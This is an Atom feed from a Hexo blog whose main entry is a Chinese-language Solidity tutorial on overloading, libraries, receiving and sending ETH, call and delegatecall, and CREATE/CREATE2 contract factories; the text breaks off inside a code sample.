<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Banana69</title>
  
  
  <link href="https://banana69.site/atom.xml" rel="self"/>
  
  <link href="https://banana69.site/"/>
  <updated>2022-11-10T11:31:09.975Z</updated>
  <id>https://banana69.site/</id>
  
  <author>
    <name>Banana69</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>solidity应用</title>
    <link href="https://banana69.site/2022/11/10/solidity%E5%BA%94%E7%94%A8/"/>
    <id>https://banana69.site/2022/11/10/solidity%E5%BA%94%E7%94%A8/</id>
    <published>2022-11-10T11:31:09.000Z</published>
    <updated>2022-11-10T11:31:09.975Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>Solididy进阶</title>
    <link href="https://banana69.site/2022/10/22/solidity%E8%BF%9B%E9%98%B6/"/>
    <id>https://banana69.site/2022/10/22/solidity%E8%BF%9B%E9%98%B6/</id>
    <published>2022-10-22T01:24:02.000Z</published>
    <updated>2022-11-10T11:29:08.220Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-函数重载"><a href="#0x01-函数重载" class="headerlink" title="0x01 函数重载"></a>0x01 函数重载</h3><p>函数名相同但输入参数类型不同的函数可以同时存在，他们被视为不同的函数。注意，<code>solidity</code>不允许修饰器（<code>modifier</code>）重载。</p><p>重载函数在经过编译后，由于不同的参数类型，其函数选择器也不相同。</p><p>再调用重载函数时，会把输入的实际参数和函数参数的变量类型做匹配，如果出现多个匹配的重载函数则会报错。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function f(uint8 _in) public pure returns (uint8 out) &#123;</span><br><span class="line">out = _in;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function f(uint256 _in) public pure returns (uint256 out) &#123;</span><br><span class="line">out = _in;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用<code>f(50)</code>会报错，因为 50 既可以被转换为 uint8 ，也可以被转换为uint256。</p><h3 id="0x02-库合约"><a href="#0x02-库合约" class="headerlink" title="0x02 库合约"></a>0x02 库合约</h3><p>库函数是一种特殊的合约，为了提升<code>solidity</code>代码的复用性和减少<code>gas</code>而存在。库合约一般都是一些好用的函数合集（<code>库函数</code>）。</p><p>库合约与普通合约有以下几点不同：</p><ol><li>不能存在状态变量</li><li>不能够继承或被继承</li><li>不能接受以太币</li><li>不可以被销毁</li></ol><p><strong>使用库合约：</strong></p><ol><li><p><strong>using for</strong></p><p> <code>using for</code>指令可将库函数附加到任何类型，添加指令后，库 A 中的函数会自动添加为 B 类型变量的成员，并且可以直接调用，<strong>在调用时，这个变量会被当作第一个参数传递给函数。</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 利用using for指令</span><br><span class="line">using Strings for uint256;</span><br><span class="line">function getString1(uint256 _number) public pure returns(string memory)&#123;</span><br><span class="line">    // 库函数会自动添加为uint256型变量的成员</span><br><span class="line">    return _number.toHexString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>通过库合约名称调用</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 直接通过库合约名调用</span><br><span class="line">function getString2(uint256 _number) public pure returns(string memory)&#123;</span><br><span class="line">    return Strings.toHexString(_number);</span><br><span class="line">&#125;`</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><p><code>String</code>库合约是将uint256类型转换为相应的<code>string</code>类型的代码库</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">library Strings &#123;</span><br><span class="line">    bytes16 private constant _HEX_SYMBOLS = &quot;0123456789abcdef&quot;;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Converts a `uint256` to its ASCII `string` decimal representation.</span><br><span class="line">     */</span><br><span class="line">    function toString(uint256 value) public pure returns (string memory) &#123;</span><br><span class="line">        // Inspired by OraclizeAPI&#x27;s implementation - MIT licence</span><br><span class="line">        // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol</span><br><span class="line"></span><br><span class="line">        if (value == 0) &#123;</span><br><span class="line">            return &quot;0&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        uint256 temp = value;</span><br><span class="line">        uint256 digits;</span><br><span class="line">        while (temp != 0) &#123;</span><br><span class="line">            digits++;</span><br><span class="line">            temp /= 10;</span><br><span class="line">        &#125;</span><br><span class="line">        bytes memory buffer = new bytes(digits);</span><br><span class="line">        while (value != 0) &#123;</span><br><span class="line">            digits -= 1;</span><br><span class="line">            buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));</span><br><span class="line">            value /= 10;</span><br><span class="line">        &#125;</span><br><span class="line">        return string(buffer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.</span><br><span class="line">     */</span><br><span class="line">    function toHexString(uint256 value) public pure returns (string memory) &#123;</span><br><span class="line">        if (value == 0) &#123;</span><br><span class="line">            return &quot;0x00&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        uint256 temp = value;</span><br><span class="line">        uint256 length = 0;</span><br><span class="line">        while (temp != 0) &#123;</span><br><span class="line">            length++;</span><br><span class="line">            temp &gt;&gt;= 8;</span><br><span class="line">        &#125;</span><br><span class="line">        return toHexString(value, length);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.</span><br><span class="line">     */</span><br><span class="line">    function toHexString(uint256 value, uint256 length) public pure returns (string memory) &#123;</span><br><span class="line">        bytes memory buffer = new bytes(2 * length + 2);</span><br><span class="line">        buffer[0] = &quot;0&quot;;</span><br><span class="line">        buffer[1] = &quot;x&quot;;</span><br><span class="line">        for (uint256 i = 2 * length + 1; i &gt; 1; --i) &#123;</span><br><span class="line">            buffer[i] = _HEX_SYMBOLS[value &amp; 0xf];</span><br><span class="line">            value &gt;&gt;= 4;</span><br><span class="line">        &#125;</span><br><span class="line">        require(value == 0, &quot;Strings: hex length insufficient&quot;);</span><br><span class="line">        return string(buffer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="接收与发送ETH"><a href="#接收与发送ETH" class="headerlink" title="接收与发送ETH"></a>接收与发送ETH</h3><h5 id="接收ETH"><a href="#接收ETH" class="headerlink" title="接收ETH"></a>接收ETH</h5><p><code>Solidity</code>支持两种特殊的回调函数，<code>receive()</code>和<code>fallback()</code>，他们主要在两种情况下被使用：</p><ol><li>接收ETH</li><li>处理合约中不存在的函数调用</li></ol><ul><li><p><strong>receive()</strong></p><p><code>receive()</code>合约用来接收ETH，一个合约最多有一个 <code>receive()</code>函数，声明该函数时必须包含<code>external</code>和<code>payable</code>关键字，当合约接收到ETH时，<code>receive()</code>会被触发。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 定义事件</span><br><span class="line">event Received(address Sender, uint Value);</span><br><span class="line">// 接收ETH时释放Received事件</span><br><span class="line">receive() external payable &#123;</span><br><span class="line">    emit Received(msg.sender, msg.value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>fallback()</strong></p><p><code>fallback()</code>函数会在调用合约不存在的函数时被触发，在声明时也必须包含<code>external</code>关键字，一般会用<code>payable</code>修饰。</p><pre><code>// fallbackfallback() external payable&#123;    emit fallbackCalled(msg.sender, msg.value, msg.data);&#125;</code></pre></li></ul><p><code>receive()</code>和<code>fallback()</code>的区别在于合约接收<code>ETH</code>时，<code>msg.data</code>为空且存在<code>receive()</code>时，会触发<code>receive()</code>；<code>msg.data</code>不为空或不存在<code>receive()</code>时，会触发<code>fallback()</code>，此时<code>fallback()</code>必须为<code>payable</code>，<code>receive()</code>和<code>payable fallback()</code>均不存在的时候，向合约发送<code>ETH</code>将会报错。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">           接收ETH</span><br><span class="line">              |</span><br><span class="line">         msg.data是空？</span><br><span class="line">            /  \</span><br><span class="line">          是    否</span><br><span class="line">          /      \</span><br><span class="line">receive()存在?   fallback()</span><br><span class="line">        / \</span><br><span class="line">       是  否</span><br><span class="line">      /     \</span><br><span class="line">receive()   fallback()</span><br></pre></td></tr></table></figure><h5 id="发送ETH"><a href="#发送ETH" class="headerlink" title="发送ETH"></a>发送ETH</h5><p>在部署可以发送ETH的合约时需要在合约中实现<code>payable</code>的构造函数和<code>receive()</code>函数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract SendETH &#123;</span><br><span class="line">    // 构造函数，payable使得部署的时候可以转eth进去</span><br><span class="line">    constructor() payable&#123;&#125;</span><br><span class="line">    // receive方法，接收eth时被触发</span><br><span class="line">    receive() external payable&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Solidity</code>有三种方法向其他合约发送<code>ETH</code>，他们是：<code>transfer()</code>，<code>send()</code>和<code>call()</code>。</p><h6 id="transfer"><a href="#transfer" class="headerlink" title="transfer"></a>transfer</h6><p>用法：<code>address(receiver).transfer(amount)</code></p><p><code>transfer()</code>的 gas 限制是 2300，可以足够用于转账，但如果接收合约中的<code>fallback()</code>或<code>receive（）</code>函数不能实现太复杂的逻辑，否则会导致错误。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function transferETH(address payable _to, uint256 amount) external payable &#123;</span><br><span class="line">_to.transfer(amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="send"><a href="#send" class="headerlink" title="send"></a>send</h6><p>用法：<code>address(receiver).send(amount)</code></p><p><code>send()</code>函数的的gas与<code>transfer()</code>相同也是2300gas，但也要求接收合约中的<code>fallback()</code>或<code>receive（）</code>函数不能实现太复杂的逻辑。</p><p>如果转账失败不会<code>revert</code>，而是会返回<code>false</code>。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function sendETH(address payable _to, uint256 amount) external payable &#123;</span><br><span class="line">bool success = _to.send(amount);</span><br><span class="line">if(!success)&#123;</span><br><span class="line">revert SendFailed();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="send-1"><a href="#send-1" class="headerlink" title="send"></a>send</h6><p>用法：<code>address(receiver).call&#123;value: amount(&quot;&quot;)&#125;</code></p><p><code>call()</code>没有gas限制，在可以支持接受合约的<code>fallback()</code>或者<code>receive()</code>实现复杂的逻辑，当<code>call()</code>转账失败也不会revert，<code>call()</code>的返回值是<code>(bool, data)</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function callSendETH(address payable _to, unint256 amount) external payable&#123;</span><br><span class="line">(bool success, )= _to.call&#123;value:amount&#125;(&quot;&quot;)</span><br><span class="line">if(!success)&#123;</span><br><span class="line">revert CallFailed();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="调用合约"><a href="#调用合约" class="headerlink" title="调用合约"></a>调用合约</h3><p>调用<code>OtherContract</code>合约</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract OtherContract &#123;</span><br><span class="line">    uint256 private _x = 0; // 状态变量_x</span><br><span class="line">    // 收到eth的事件，记录amount和gas</span><br><span class="line">    event Log(uint amount, uint gas);</span><br><span class="line">    </span><br><span class="line">    // 返回合约ETH余额</span><br><span class="line">    function getBalance() view public returns(uint) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 可以调整状态变量_x的函数，并且可以往合约转ETH (payable)</span><br><span class="line">    function setX(uint256 x) external payable&#123;</span><br><span class="line">        _x = x;</span><br><span class="line">        // 如果转入ETH，则释放Log事件</span><br><span class="line">        if(msg.value &gt; 0)&#123;</span><br><span class="line">            emit Log(msg.value, gasleft());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 读取_x</span><br><span class="line">    function getX() external view returns(uint x)&#123;</span><br><span class="line">        x = _x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="传入合约地址"><a href="#传入合约地址" class="headerlink" title="传入合约地址"></a>传入合约地址</h5><p>可以利用合约的地址和合约代码（接口）来创建合约的引用：<code>_name(_Address)</code>，其中<code>_Name</code>是合约名，<code>_Address</code>是合约地址。然后用合约的引用来调用合约中的函数。如：<code>_Name(_Address).func()</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function callSetX(address _Address, uint256 x) external &#123;</span><br><span class="line">OtherContract(_Address).setX(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="传入合约变量"><a href="#传入合约变量" class="headerlink" title="传入合约变量"></a>传入合约变量</h5><p>可以直接在函数里传入合约的引用，只需要把上面参数的<code>address</code>类型更改目标合约名，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function callgetX(OtherContract _Address) external view returns(uint x)&#123;</span><br><span class="line">x = _Address.getX();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="创建合约变量"><a href="#创建合约变量" class="headerlink" title="创建合约变量"></a>创建合约变量</h5><p>可以通过创建合约变量，然后通过合约变量来调用目标函数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function callGetX(address _Address) external view returns(uin x)&#123;</span><br><span class="line">OtherContract oc = OtherContract(_Address);</span><br><span class="line">x = oc.getX();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="调用合约并发送ETH"><a href="#调用合约并发送ETH" class="headerlink" title="调用合约并发送ETH"></a>调用合约并发送ETH</h5><p>如果目标合约的函数是<code>payable</code>的，那么我们可以通过调用它给合约进行转账：<code>_Name(_Address).func&#123;value:_Value&#125;()</code></p><blockquote><p>在小于0.6.2的版本为：Name(ContractAddress).value(Value).gas(Gas)()</p></blockquote><h3 id="Call"><a href="#Call" class="headerlink" title="Call"></a>Call</h3><p><code>call</code> 是<code>address</code>类型的低级成员函数，它用来与其他合约交互。它的返回值为<code>(bool, data)</code>，分别对应<code>call</code>是否成功以及目标函数的返回值。</p><ul><li><code>call</code>是<code>solidity</code>官方推荐的通过触发<code>fallback</code>或<code>receive</code>函数发送<code>ETH</code>的方法。</li><li>不推荐用<code>call</code>来调用另一个合约，因为当你调用不安全合约的函数时，你就把主动权交给了它。推荐的方法仍是声明合约变量后调用函数。</li><li>当我们不知道对方合约的源代码或<code>ABI</code>，就没法生成合约变量；这时，我们仍可以通过<code>call</code>调用对方合约的函数。</li></ul><p>规则：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contractAddress.call(二进制编码)</span><br></pre></td></tr></table></figure><p>二进制编码可以利用<code>abi.encodeWithSignature</code>获得</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abi.encodeWithSignature(&quot;函数签名&quot;，具体参数)</span><br></pre></td></tr></table></figure><p><code>call</code>在调用合约时也可以指定交易发送的<code>value</code>和<code>gas</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contractAddress.call&#123;value:amount, gas:gasAmount&#125;(abi.encodeWithSignature(&quot;funcSig&quot;,params))</span><br></pre></td></tr></table></figure><p>利用<code>call</code>调用<code>OtherContrat</code>合约</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function callSetX(address payable _addr, uint256 x) public payable &#123;</span><br><span class="line">(bool success, bytes memory data) = _addr.call&#123;value:sg.value&#125;(</span><br><span class="line">abi.encodeWithSignature(&quot;setX(uint256)&quot;,x)</span><br><span class="line">);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果利用<code>call</code>调用合约中不存在的函数，那么目标合约中的<code>fallback</code>函数会被触发</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function callNonExist(address _addr) external&#123;</span><br><span class="line">    // call getX()</span><br><span class="line">    (bool success, bytes memory data) = _addr.call(</span><br><span class="line">        abi.encodeWithSignature(&quot;foo(uint256)&quot;)</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时<code>call</code>还是会调用成功，并返回<code>success</code>，但是其实调用的是目标合约中的<code>fallback</code>函数</p><h3 id="Delegetecall"><a href="#Delegetecall" class="headerlink" title="Delegetecall"></a>Delegetecall</h3><p><code>delegatecall</code>也是 solidity 中 <code>address</code> 类型的低级成员函数。</p><p>当用户<code>A</code>通过合约<code>B</code>来<code>call</code>合约<code>C</code>的时候，执行的是合约<code>C</code>的函数，<code>语境</code>(<code>Context</code>，可以理解为包含变量和状态的环境)也是合约<code>C</code>的：<code>msg.sender</code>是<code>B</code>的地址，并且如果函数改变一些状态变量，产生的效果会作用于合约<code>C</code>的变量上。</p><p><img src="/image/solidity%E8%BF%9B%E9%98%B6.assets/image-20221103211841263.png" alt="image-20221103211841263"></p><p>而当用户<code>A</code>通过合约<code>B</code>来<code>delegatecall</code>合约<code>C</code>的时候，执行的是合约<code>C</code>的函数，但是<code>语境</code>仍是合约<code>B</code>的：<code>msg.sender</code>是<code>A</code>的地址，并且如果函数改变一些状态变量，产生的效果会作用于合约<code>B</code>的变量上。</p><p><img src="/image/solidity%E8%BF%9B%E9%98%B6.assets/image-20221103212047007.png" alt="image-20221103212047007"></p><p>相当于把合约C的代码拉过来在B的环境下执行。</p><p>规则也与<code>call</code>类似：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contractAddress.delegatecall(二进制编码)</span><br></pre></td></tr></table></figure><p>与<code>call</code>不同的是，<code>delegatecall</code>在调用合约时可以指定交易发送的<code>gas</code>，但不能指定发送的<code>ETH</code>数额。</p><p>**<font color=red>注意</font>**：<code>delegatecall</code>有安全隐患，使用时要保证当前合约和目标合约的状态变量存储结构相同，并且目标合约安全，不然会造成资产损失。</p><p>使用<code>delegatecall</code>的应用场景：</p><ol><li>代理合约（<code>Proxy Contract</code>）：将智能合约的存储合约和逻辑合约分开：代理合约（<code>Proxy Contract</code>）存储所有相关的变量，并且保存逻辑合约的地址；所有函数存在逻辑合约（<code>Logic Contract</code>）里，通过<code>delegatecall</code>执行。当升级时，只需要将代理合约指向新的逻辑合约即可。</li><li>EIP-2535 Diamonds（钻石）：钻石是一个支持构建可在生产中扩展的模块化智能合约系统的标准。钻石是具有多个实施合同的代理合同。 更多信息请查看：<a href="https://eip2535diamonds.substack.com/p/introduction-to-the-diamond-standard">钻石标准简介</a>。</li></ol><p>例子：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 被调用的合约C</span><br><span class="line">contract C &#123;</span><br><span class="line">    uint public num;</span><br><span class="line">    address public sender;</span><br><span class="line"></span><br><span class="line">    function setVars(uint _num) public payable &#123;</span><br><span class="line">        num = _num;</span><br><span class="line">        sender = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发起调用的合约：</p><p>首先，合约<code>B</code>必须和目标合约<code>C</code>的变量存储布局必须相同，两个变量，并且顺序为<code>num</code>和<code>sender</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract B &#123;</span><br><span class="line">    uint public num;</span><br><span class="line">    address public sender;</span><br></pre></td></tr></table></figure><p><code>callSetVars</code>函数通过<code>call</code>来调用<code>setVars</code>。它有两个参数<code>_addr</code>和<code>_num</code>，分别对应合约<code>C</code>的地址和<code>setVars</code>的参数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 通过call来调用C的setVars()函数，将改变合约C里的状态变量</span><br><span class="line">   function callSetVars(address _addr, uint _num) external payable&#123;</span><br><span class="line">       // call setVars()</span><br><span class="line">       (bool success, bytes memory data) = _addr.call(</span><br><span class="line">           abi.encodeWithSignature(&quot;setVars(uint256)&quot;, _num)</span><br><span class="line">       );</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p><code>delegatecallSetVars</code>函数通过<code>delegatecall</code>来调用<code>setVars</code>。与上面的<code>callSetVars</code>函数相同，有两个参数<code>_addr</code>和<code>_num</code>，分别对应合约<code>C</code>的地址和<code>setVars</code>的参数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    // 通过delegatecall来调用C的setVars()函数，将改变合约B里的状态变量</span><br><span class="line">    function delegatecallSetVars(address _addr, uint _num) external payable&#123;</span><br><span class="line">        // delegatecall setVars()</span><br><span class="line">        (bool success, bytes memory data) = _addr.delegatecall(</span><br><span class="line">            abi.encodeWithSignature(&quot;setVars(uint256)&quot;, _num)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="在合约中创建新合约"><a href="#在合约中创建新合约" class="headerlink" title="在合约中创建新合约"></a><font color=purple>在合约中创建新合约</font></h3><p>在以太坊链上，用户（外部账户，<code>EOA</code>）可以创建智能合约，智能合约同样也可以创建新的智能合约。去中心化交易所<code>uniswap</code>就是利用工厂合约（<code>Factory</code>）创建了无数个币对合约（<code>Pair</code>）。</p><p>有俩种方法可以创建智能合约</p><h5 id="Create"><a href="#Create" class="headerlink" title="Create:"></a><font color=red><strong>Create:</strong></font></h5><p>new 一个合约，并传入新合约构造函数所需的参数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Contract x = new Contract&#123;value: _value&#125;(params)</span><br></pre></td></tr></table></figure><p>其中<code>Contract</code>是要创建的合约名，<code>x</code>是合约对象（地址），如果构造函数是<code>payable</code>，可以创建时转入<code>_value</code>数量的<code>ETH</code>，<code>params</code>是新合约构造函数的参数。</p><p><code>Uniswap V2</code><a href="https://github.com/Uniswap/v2-core/tree/master/contracts">核心合约</a>中包含两个合约：</p><ol><li>UniswapV2Pair: 币对合约，用于管理币对地址、流动性、买卖。</li><li>UniswapV2Factory: 工厂合约，用于创建新的币对，并管理币对地址。</li></ol><p>下面我们用<code>create</code>方法实现一个极简版的<code>Uniswap</code>：<code>Pair</code>币对合约负责管理币对地址，<code>PairFactory</code>工厂合约用于创建新的币对，并管理币对地址。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Pair &#123;</span><br><span class="line">address public factory;   //工厂合约地址</span><br><span class="line">address public token0;//代币1</span><br><span class="line">address public token1;//代币2</span><br><span class="line"></span><br><span class="line">constructor() payable &#123;</span><br><span class="line">factory = msg.sender;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 在部署时由工厂调用一次</span><br><span class="line">function initialize(address _token0, address _token1) external &#123;</span><br><span class="line">require(msg.sender ==factory, &quot;Uniswapv2;FORBIDDEN&quot;);</span><br><span class="line">token0 = _token0;</span><br><span class="line">token1 = _token1;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Pair</code>合约很简单，包含3个状态变量：<code>factory</code>，<code>token0</code>和<code>token1</code>。</p><p>构造函数<code>constructor</code>在部署时将<code>factory</code>赋值为工厂合约地址。<code>initialize</code>函数会在<code>Pair</code>合约创建的时候被工厂合约调用一次，将<code>token0</code>和<code>token1</code>更新为币对中两种代币的地址。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract PairFactory &#123;</span><br><span class="line">//通过俩个代币地址查Pair地址</span><br><span class="line">mapping(address =&gt; mapping(address =&gt; address)) public getPair;</span><br><span class="line">address[] public allPairs;//保存所有Pair地址</span><br><span class="line"></span><br><span class="line">function createPair(address tokenA, address tokenB) external returns(address pairAddr) &#123;</span><br><span class="line">//创建新合约</span><br><span class="line">Pair pair = new Pair();</span><br><span class="line">//调用新合约的initialize方法</span><br><span class="line">pair.initialize(tokenA, tokenB);</span><br><span class="line">//更新地址map</span><br><span class="line">pairAddr = address(pair);</span><br><span class="line">allPairs.push(pairAddr);</span><br><span class="line">getPair[tokenA][tokenB] = pairAddr;</span><br><span class="line">getPair[tokenB][tokenA] = pairAddr;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>工厂合约（<code>PairFactory</code>）有两个状态变量<code>getPair</code>是两个代币地址到币对地址的<code>map</code>，方便根据代币找到币对地址；<code>allPairs</code>是币对地址的数组，存储了所有代币地址。</p><p><code>PairFactory</code>合约只有一个<code>createPair</code>函数，根据输入的两个代币地址<code>tokenA</code>和<code>tokenB</code>来创建新的<code>Pair</code>合约。其中</p><p><code>Pair pair = new Pair();</code></p><h5 id="Create2"><a href="#Create2" class="headerlink" title="Create2:"></a><font color=red><strong>Create2:</strong></font></h5><p>CREATE2 操作码使我们在智能合约部署在以太坊网络之前就能预测合约的地址。Uniswap创建Pair合约用的就是CREATE2而不是CREATE.</p><h6 id="create-地址计算"><a href="#create-地址计算" class="headerlink" title="create 地址计算"></a>create 地址计算</h6><p>智能合约可以由其他合约和普通账户利用<code>CREATE</code>操作码创建。 在这两种情况下，新合约的地址都以相同的方式计算：创建者的地址(通常为部署的钱包地址或者合约地址)和<code>nonce</code>(该地址发送交易的总数,对于合约账户是创建的合约总数,每创建一个合约nonce+1))的哈希。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">新合约_Address = hash(创建着地址，nonce)</span><br></pre></td></tr></table></figure><p>创建者地址不会变，但<code>nonce</code>可能会随时间而改变，因此用<code>CREATE</code>创建的合约地址不好预测。</p><h6 id="create2地址计算"><a href="#create2地址计算" class="headerlink" title="create2地址计算"></a>create2地址计算</h6><p><code>CREATE2</code>的目的是为了让合约地址独立于未来的事件。不管未来区块链上发生了什么，你都可以把合约部署在事先计算好的地址上。用<code>CREATE2</code>创建的合约地址由4个部分决定：</p><ul><li><code>0xFF</code>：一个常数，避免和<code>CREATE</code>冲突</li><li>创建者地址</li><li><code>salt</code>（盐）：一个创建者给定的数值</li><li>待部署合约的字节码（<code>bytecode</code>）</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">newAddress = hash(&quot;0xFF&quot;,创建者地址, salt, bytecode)</span><br></pre></td></tr></table></figure><p><code>CREATE2</code> 确保，如果创建者使用 <code>CREATE2</code> 和提供的 <code>salt</code> 部署给定的合约<code>bytecode</code>，它将存储在新地址中。</p><p><strong>create2用法：</strong></p><p>与<strong>create</strong>类似，但是需要多传入一个 <code>salt</code>参数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Contract x = new Contract&#123;salt: _salt, value: _value&#125;(params)</span><br></pre></td></tr></table></figure><p>使用 <code>create2</code>实现Uniswap</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Pair&#123;</span><br><span class="line">    address public factory; // 工厂合约地址</span><br><span class="line">    address public token0; // 代币1</span><br><span class="line">    address public token1; // 代币2</span><br><span class="line"></span><br><span class="line">    constructor() payable &#123;</span><br><span class="line">        factory = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // called once by the factory at time of deployment</span><br><span class="line">    function initialize(address _token0, address _token1) external &#123;</span><br><span class="line">        require(msg.sender == factory, &#x27;UniswapV2: FORBIDDEN&#x27;); // sufficient check</span><br><span class="line">        token0 = _token0;</span><br><span class="line">        token1 = _token1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造函数<code>constructor</code>在部署时将<code>factory</code>赋值为工厂合约地址。<code>initialize</code>函数会在<code>Pair</code>合约创建的时候被工厂合约调用一次，将<code>token0</code>和<code>token1</code>更新为币对中两种代币的地址。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract PairFactory2&#123;</span><br><span class="line">        mapping(address =&gt; mapping(address =&gt; address)) public getPair; // 通过两个代币地址查Pair地址</span><br><span class="line">        address[] public allPairs; // 保存所有Pair地址</span><br><span class="line"></span><br><span class="line">        function createPair2(address tokenA, address tokenB) external returns (address pairAddr) &#123;</span><br><span class="line">            require(tokenA != tokenB, &#x27;IDENTICAL_ADDRESSES&#x27;); //避免tokenA和tokenB相同产生的冲突</span><br><span class="line">            // 计算用tokenA和tokenB地址计算salt</span><br><span class="line">            //将tokenA和tokenB按大小排序</span><br><span class="line">            (address token0, address token1) = tokenA &lt; tokenB ? (tokenA, tokenB) : (tokenB, tokenA); </span><br><span class="line">            bytes32 salt = keccak256(abi.encodePacked(token0, token1));</span><br><span class="line">            // 用create2部署新合约</span><br><span class="line">            Pair pair = new Pair&#123;salt: salt&#125;(); </span><br><span class="line">            // 调用新合约的initialize方法</span><br><span class="line">            pair.initialize(tokenA, tokenB);</span><br><span class="line">            // 更新地址map</span><br><span class="line">            pairAddr = address(pair);</span><br><span class="line">            allPairs.push(pairAddr);</span><br><span class="line">            getPair[tokenA][tokenB] = pairAddr;</span><br><span class="line">            getPair[tokenB][tokenA] = pairAddr;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>工厂合约（<code>PairFactory2</code>）有两个状态变量<code>getPair</code>是两个代币地址到币对地址的<code>map</code>，方便根据代币找到币对地址；<code>allPairs</code>是币对地址的数组，存储了所有币对地址。</p><p><code>PairFactory2</code>合约只有一个<code>createPair2</code>函数，使用<code>CREATE2</code>根据输入的两个代币地址<code>tokenA</code>和<code>tokenB</code>来创建新的<code>Pair</code>合约。其中</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Pair pair = new Pair&#123;salt: salt&#125;(); </span><br></pre></td></tr></table></figure><p>就是利用<code>CREATE2</code>创建合约的代码，非常简单，而<code>salt</code>为<code>token1</code>和<code>token2</code>的<code>hash</code>：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bytes32 salt = keccak256(abi.encodePacked(token0, 